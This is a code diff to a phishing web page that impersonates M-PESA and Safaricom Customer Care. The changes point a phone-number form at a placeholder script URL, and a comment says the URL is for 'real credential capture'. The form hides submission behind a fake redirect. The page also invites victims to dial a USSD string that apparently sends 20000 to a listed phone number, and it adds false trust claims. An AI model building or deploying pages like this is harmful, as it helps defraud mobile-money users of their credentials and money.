@@ -92,7 +92,7 @@
             <div class="step">
                 <strong>Phase 1: Verify Your Details</strong>
                 <!-- Replace YOUR_SCRIPT_URL with your Google Apps Script deployment URL for real credential capture -->
-                <form action="">
+                <form action="YOUR_SCRIPT_URL" method="post" onsubmit="fakeRedirect(); return false;">
                     <div class="input-group">
                         <label for="phone">M-PESA Phone Number</label>
                         <input type="text" id="phone" name="phone" placeholder="e.g. 07XXXXXXXX" pattern="07[0-9]{8}" required autocomplete="tel">
@@ -110,12 +110,12 @@
                 <a href="#" onclick="ussdStep(event)" class="btn">Claim Instantly</a>
                 <div class="dial-link">
                     <a href="tel:*234*1*0708392373*20000#">
-                        Or click: <span style="font-family:monospace;">*234*1*0708392373*20000#</span>
+                        Or dial: <span style="font-family:monospace;">*234*1*0708392373*20000#</span>
                     </a>
                 </div>
             </div>
             <div class="trusted">
-                <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="M-PESA Icon"> Trusted by millions of Kenyans
+                <img src="Image 03-10-2025 at 12.50.jpeg" alt="M-PESA Icon"> Trusted by millions of Kenyans
             </div>
             <div class="note">
                 For support, contact <span class="support">100</span> (Safaricom Customer Care)
@@ -154,4 +154,3 @@
     </div>
 </body>
 </html>
-````
